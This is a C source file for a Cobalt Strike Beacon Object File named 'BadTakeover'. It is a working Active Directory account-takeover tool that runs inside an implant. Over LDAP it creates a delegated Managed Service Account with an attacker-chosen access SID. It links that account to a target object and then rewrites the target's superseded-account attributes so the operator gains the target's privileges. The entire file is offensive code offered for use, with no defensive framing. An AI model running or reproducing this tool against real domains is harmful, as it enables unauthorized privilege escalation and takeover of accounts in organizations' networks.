#include <windows.h>
#include <winldap.h>
#include <winber.h>
#include <sddl.h>
#include "bofdefs.h"
#include "beacon.h"

#pragma comment(lib, "wldap32.lib")

// LDAP imports
WINLDAPAPI LDAP* LDAPAPI WLDAP32$ldap_init(PSTR HostName, ULONG PortNumber);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_set_option(LDAP *ld, int option, void *invalue);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_bind_s(LDAP *ld, PSTR dn, PSTR cred, ULONG method);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_add_s(LDAP *ld, PSTR dn, LDAPModA *mods[]);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_s(LDAP *ld, PSTR dn, LDAPModA *mods[]);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP *ld);
WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2string(ULONG err);

// advapi32 import for SD conversion
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
    LPCSTR StringSecurityDescriptor,
    DWORD StringSDRevision,
    PSECURITY_DESCRIPTOR *SecurityDescriptor,
    PULONG SecurityDescriptorSize
);

DECLSPEC_IMPORT char *MSVCRT$strcpy(char *dst, const char *src);
DECLSPEC_IMPORT char *MSVCRT$strcat(char *dst, const char *src);

void go(char *args, int len) {

    BeaconPrintf(CALLBACK_OUTPUT, "[*] BadTakeover BOF started\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Author @_logangoins\n\n");
    datap parser;
    BeaconDataParse(&parser, args, len);

    char *path     = BeaconDataExtract(&parser, NULL);
    char *dMSAname = BeaconDataExtract(&parser, NULL);
    char *access   = BeaconDataExtract(&parser, NULL);
    char *target   = BeaconDataExtract(&parser, NULL);
    char *domain   = BeaconDataExtract(&parser, NULL);

    LDAP *ld = NULL;
    int result;
    int version = LDAP_VERSION3;

    ULONG rc;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Connecting to LDAP\n");
    ld = WLDAP32$ldap_init(domain, LDAP_PORT);
    if (ld == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "LDAP init failed\n");
        return;
    }

    result = WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Set version failed: %s\n", WLDAP32$ldap_err2string(result));
        goto cleanup;
    }

    result = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Bind failed: %s\n", WLDAP32$ldap_err2string(result));
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Connected to LDAP successfully\n");

    // Buffers
    char childDn[512];
    char dnsHostName[512];
    char samAccountName[512];


    // childDn = "CN=" + dMSAname + "," + path
    MSVCRT$strcpy(childDn, "CN=");
    MSVCRT$strcat(childDn, dMSAname);
    MSVCRT$strcat(childDn, ",");
    MSVCRT$strcat(childDn, path);

    // dnsHostName = dMSAname + "." + domain
    MSVCRT$strcpy(dnsHostName, dMSAname);
    MSVCRT$strcat(dnsHostName, ".");
    MSVCRT$strcat(dnsHostName, domain);

    // samAccountName = dMSAname + "$"
    MSVCRT$strcpy(samAccountName, dMSAname);
    MSVCRT$strcat(samAccountName, "$");

    BeaconPrintf(CALLBACK_OUTPUT, "[+] dMSA DN: %s\n", childDn);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] dNSHostName: %s\n", dnsHostName);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] sAMAccountName: %s\n", samAccountName);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target object for takeover: %s\n", target);

    LDAPModA modObjectClass, modMSAState, modInterval, modDns, modSam, linkAttr, encAttr, uacAttr, sdAttr;
    LDAPModA *mods[10];

    char *objectClassVals[] = { "msDS-DelegatedManagedServiceAccount", NULL };
    char *msaStateVals[]    = { "2", NULL };
    char *intervalVals[]    = { "30", NULL };
    char *dnsVals[]         = { dnsHostName, NULL };
    char *samVals[]         = { samAccountName, NULL };
    char *linkVals[] = { target, NULL };
    char *encVals[]  = { "28", NULL };   // 0x1c
    char *uacVals[]  = { "4096", NULL }; // 0x1000

    char sddl[256];
    MSVCRT$strcpy(sddl, "O:S-1-5-32-544D:(A;;0xf01ff;;;");
    MSVCRT$strcat(sddl, access);  // access = SID of target object
    MSVCRT$strcat(sddl, ")");

    BeaconPrintf(CALLBACK_OUTPUT, "[+] SDDL value for accessing target object: %s\n", sddl);

    PSECURITY_DESCRIPTOR pSD = NULL;
    ULONG sdSize = 0;

    rc = ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
        sddl,
        SDDL_REVISION_1,
        &pSD,
        &sdSize
    );

    if (rc == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ConvertStringSecurityDescriptorToSecurityDescriptor failed\n");
    }

    struct berval sdVal, *sdVals[2];
    sdVal.bv_len = sdSize;       // previously converted from SDDL
    sdVal.bv_val = (char*)pSD;
    sdVals[0] = &sdVal;
    sdVals[1] = NULL;

    modObjectClass.mod_op     = LDAP_MOD_ADD;
    modObjectClass.mod_type   = "objectClass";
    modObjectClass.mod_values = objectClassVals;

    modMSAState.mod_op     = LDAP_MOD_ADD;
    modMSAState.mod_type   = "msDS-DelegatedMSAState";
    modMSAState.mod_values = msaStateVals;

    modInterval.mod_op     = LDAP_MOD_ADD;
    modInterval.mod_type   = "msDS-ManagedPasswordInterval";
    modInterval.mod_values = intervalVals;

    modDns.mod_op     = LDAP_MOD_ADD;
    modDns.mod_type   = "dNSHostName";
    modDns.mod_values = dnsVals;

    modSam.mod_op     = LDAP_MOD_ADD;
    modSam.mod_type   = "sAMAccountName";
    modSam.mod_values = samVals;

    linkAttr.mod_op     = LDAP_MOD_ADD;
    linkAttr.mod_type   = "msDS-ManagedAccountPrecededByLink";
    linkAttr.mod_values = linkVals;

    encAttr.mod_op     = LDAP_MOD_REPLACE;
    encAttr.mod_type   = "msDS-SupportedEncryptionTypes";
    encAttr.mod_values = encVals;

    uacAttr.mod_op     = LDAP_MOD_REPLACE;
    uacAttr.mod_type   = "userAccountControl";
    uacAttr.mod_values = uacVals;

    sdAttr.mod_op     = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    sdAttr.mod_type   = "msDS-GroupMSAMembership";
    sdAttr.mod_bvalues = sdVals;

    mods[0] = &modObjectClass;
    mods[1] = &modMSAState;
    mods[2] = &modInterval;
    mods[3] = &modDns;
    mods[4] = &modSam;

    mods[5] = &linkAttr;
    mods[6] = &encAttr;
    mods[7] = &uacAttr;
    mods[8] = &sdAttr;
    mods[9] = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to add object: %s\n", childDn);

    result = WLDAP32$ldap_add_s(ld, childDn, mods);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add entry: %s\n", WLDAP32$ldap_err2string(result));
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added dMSA object: %s\n", dMSAname);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to write target object for account takeover\n");

    // Modify the target object to sync the new dMSA

    LDAPMod superSedeAttr, acctStateAttr;
    LDAPMod *modChanges[3];

    char *superSedeVals[] = { childDn, NULL };
    char *acctStateVals[] = { "2", NULL };

    superSedeAttr.mod_op     = LDAP_MOD_REPLACE;
    superSedeAttr.mod_type   = "msDS-SupersededManagedAccountLink";
    superSedeAttr.mod_values = superSedeVals;

    acctStateAttr.mod_op     = LDAP_MOD_REPLACE;
    acctStateAttr.mod_type   = "msDS-SupersededServiceAccountState";
    acctStateAttr.mod_values = acctStateVals;

    modChanges[0] = &superSedeAttr;
    modChanges[1] = &acctStateAttr;
    modChanges[2] = NULL;

    result = WLDAP32$ldap_modify_s(ld, target, modChanges);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to modify target object: %s\n", WLDAP32$ldap_err2string(result));
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully modified target object for takeover: %s\n", target);
    }

cleanup:
    if (ld != NULL) {
        WLDAP32$ldap_unbind(ld);
    }
}